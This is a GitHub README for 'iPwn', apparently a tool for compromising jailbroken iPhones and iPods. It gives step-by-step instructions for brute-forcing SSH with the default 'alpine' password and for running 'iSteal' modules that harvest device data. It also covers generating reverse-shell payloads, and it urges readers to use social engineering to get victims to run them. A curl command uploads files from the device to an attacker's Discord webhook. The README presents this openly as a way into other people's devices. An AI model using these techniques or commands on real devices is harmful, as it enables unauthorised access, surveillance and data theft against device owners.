# iPwn
A Framework meant for the exploitation of iOS devices.
![image](https://user-images.githubusercontent.com/78043996/119547132-ba00ee80-bd62-11eb-989a-1b9522ca6bd4.png)

<!> REMEMBER: THE IPHONE YOU ARE ATTEMPTING TO GET INTO USING THIS TOOL MUST BE JAILBROKEN <!>
# Status - ❌
This project is still being worked on. I'm adding more extensions and options for post-exploitation for harvesting Device information and other things. Im also working on a way to put a payload in a normal iOS tweak so that getting a reverse shell can be easier.

# Update logs
[6/2/21] - Added an extra menu for people that have their devices connected to their computer and want to tinker with them. Will be adding more to this soon.

[6/2/21] - Added 4 extra modules for the 'iSteal' post-exploitation tool. Also added an option to install the checkra1n jailbreak.

[5/25/21] - Added 8 extra modules for the 'iSteal' post-exploitation tool.

[5/25/21] - Added 2 extra modules for the 'iSteal' post-exploitation tool.

# Description/How to use [FOR NOOBIES!!!]
iPwn is a framework meant for exploiting and and gaining access to iOS devices. It also has an extension that is a mini-framework called 'iSteal' that is meant for post-exploitation (after you get access to the device). This description will walk you through the different ways and steps to get access to an iOS device and harvest information from it.

The first way of getting access to an iOS device. - SSH-Bruteforcing.

Most jailbroken iOS devices with Cydia come prepackaged with OpenSSH. And usually, the credentials are very weak or common, one of the most common passwords will be included in a wordlist that should be in your folder if you downloaded iPwn from my Github.

So lets begin! So first off, we'll start by running the script.
```
python main.py
```
Then, we are going to type in the 'brute' command. (If you want to type help and get familiar with the commands, you may do so.)
![image](https://user-images.githubusercontent.com/78043996/119564117-67313200-bd76-11eb-9acd-e80b952f138d.png)

Once we type in the 'brute' command. Type in 'help' to display all the available commands.
![image](https://user-images.githubusercontent.com/78043996/119564260-95167680-bd76-11eb-8adb-122e9455d47d.png)
Now, we are going to use the 'default' command to start SSH-Bruteforcing with a wordlist containing the most common passwords.
You will be asked to enter the targets IP address, please ensure you are entering the correct and vaild one, press enter, then move on with the next step.
![image](https://user-images.githubusercontent.com/78043996/119564509-deff5c80-bd76-11eb-9df7-a58df14cb08e.png)

<!> IF YOU ARE GETTING ERRORS, PLEASE MAKE SURE THAT HYDRA IS INSTALLED, YOU CAN INSTALL HYDRA WITH THE COMMANDS BELOW <!>
```
commands to install hydra:

sudo apt install hydra
sudo pacman -S hydra
```
Now back to the tutorial, if you have hydra installed on your PC, it should already be attempting to bruteforce. Just sit tight for about 20-40 seconds and if the device does use the default/common credentails supplied in the wordlist, then Hydra should give you a little message that shows the correct password.
![image](https://user-images.githubusercontent.com/78043996/119565382-deb39100-bd77-11eb-9081-c0a500acbf65.png)

As we can see, the correct password is 'alpine'. Now we can login into the phone by doing 'ssh root@ip_goes_here' on another terminal window. Once it prompts you for a password just enter in the password you got from Hydra.
![image](https://user-images.githubusercontent.com/78043996/119565646-35b96600-bd78-11eb-9602-09de842470b1.png)

Now we are logged in!

![image](https://user-images.githubusercontent.com/78043996/119565745-54b7f800-bd78-11eb-864e-60e569ab4dbc.png)

At this point we probably want to gather some information on the phone and control it, that will come later. Because first, we need to install some very important things. If you want to use SCP to transfer the setup file that automates everything then you may do so. The file is in /post-exploitation/post.sh.
Once you transfered the 'post.sh' file over to the iOS device, execute it by doing 'bash post.sh' and it should start installing and setting up the post exploitation tools that we will use.

<!> NOTE: THE COMMANDS BELOW WILL ONLY BE FOR THE PEOPLE THAT WANT TO INSTALL THE NECESSARY PACKAGES AND TOOLS MANUALLY <!>
```
run all these commands to setup/install everything thats needed:

apt install netcat
apt install python3
apt install nano
git clone https://github.com/0x1CA3/iSteal.git
```

Ok, so now that we have everything installed, we can go into the 'iSteal' folder and run the 'iSteal' post-exploitation script.
```
python3 post.py
```
<!> NOTE: Make sure when you try running python files, you run it using "python3" instead of "python" or "py" <!>

So now the script should be loaded, if you would like to use the 'help' command and look around, you may do so.
![image](https://user-images.githubusercontent.com/78043996/119568186-3c95a800-bd7b-11eb-9e3c-55c0dcdbefe1.png)

Now, we are going to use the 'list' command to show the available modules/options for post-exploitation.
![image](https://user-images.githubusercontent.com/78043996/119593903-d45dbb00-bda8-11eb-9dda-3f59b25b98b6.png)

<!> KEEP IN MIND: THERE WILL BE ALOT OF UPDATES ON THE POST-EXPLOITATION SCRIPT, AND MORE MODULES WILL BE ADDED, SO THIS IMAGE WILL BE UPDATED FOR THE SAKE OF BEING ACCURATE <!>

To use a module, simply do 'use specific/module'. Example: use modules/list_installed_default_apps

And as you can see, when we run that module, it shows us the installed default applications on the targets iOS device.
![image](https://user-images.githubusercontent.com/78043996/119568907-0e649800-bd7c-11eb-9f11-895a0db41a5b.png)


The second way to get access to an iOS device. - Reverse shell.

Now, im going to show you how to do it the second way, which is a little more advanced. Keep in mind, I wont include pictures for this part.
```
run the iPwn framework by doing 'python main.py'
type in the 'payload' command
wait for the payload factory to load.
select a payload of your choice, Example: use payloads/factory/reverse_bash
enter your IP
enter your Port
then you should get a message that says 'payload generated'
type in the 'back' command to go back to the main menu
type in the 'listen' command to start listening for incoming connections
make sure that your victim runs the script via terminal or throught their own way, try social engineering, be creative!
once the script is executed on the victims iOS device, you should get a connection
install the important packages via transferring the 'post.sh' located in /post-exploitation and executing it, or manually do it yourself.
you can now run the 'iSteal' or 'AutoEnum' post-exploitation tools
have fun! :)
```
<!> If you are doing step 2 and get stuck on the part where you have to install the important packages/tools, go into step 1 and copy the guide for installing the packages/tools! <!>

# File transfer/Extraction
There's multiple ways to transfer files to the iOS device and there's also lots of ways to download them. The easiest way to extract and download files from the iOS device is to use Curl and a discord webhook.

<!> NOTE: The segment below will demonstrate how to extract and download files from the iOS device using curl <!>

```
Step 1: Create a discord server
Step 2: Create a webhook and copy the link
Step 3: On the iOS device, navigate towards the directory that contains the file you want to retrieve.
Step 4: enter the command below (replace file_here.txt with the name of your file, replace webhook_url_here with your webhook url)

curl -i -H 'Expect: application/json' -F file=@file_here.txt -F 'payload_json={ "wait": true, "content": "", "username": "" }' webhook_url_here

Step 5: wait around 10-50 seconds
Done! The file should now be uploaded to your discord server. You can now download/view the file.
```

# Tested OS's
```
Windows 10 - Stable
Garuda Linux - Stable
Arch based distros - Stable
```

# Supported and tested iOS devices
```
Supported Devices [The post-exploitation extension should work for all of these]
-----------------
iPods newer than the 4th Gen iPod
iPhone 4
iPhone 4S
iPhone 5
iPhone 6
iPhone SE
iPhone 7
iPhone 7+
iPhone 8
iPhone 8+
iPhone X
iPhone XR
iPhone XS
iPhone 11
iPhone 12

My own tested devices [Ones I myself have personally tested]
---------------------
iPhone 4S
iPhone 5S
iPhone SE
iPhone 7+
iPad Air
iPod 4th Gen
```

# Screenshots
![image](https://user-images.githubusercontent.com/78043996/119547477-2845b100-bd63-11eb-96bb-f01106e833b6.png)
![image](https://user-images.githubusercontent.com/78043996/119548701-7909d980-bd64-11eb-9adf-774cc787586e.png)
![image](https://user-images.githubusercontent.com/78043996/119549700-7f4c8580-bd65-11eb-8131-0f261883df45.png)
![image](https://user-images.githubusercontent.com/78043996/119549828-a3a86200-bd65-11eb-831e-5de71ea65323.png)

# Credits
[https://github.com/0x1CA3]
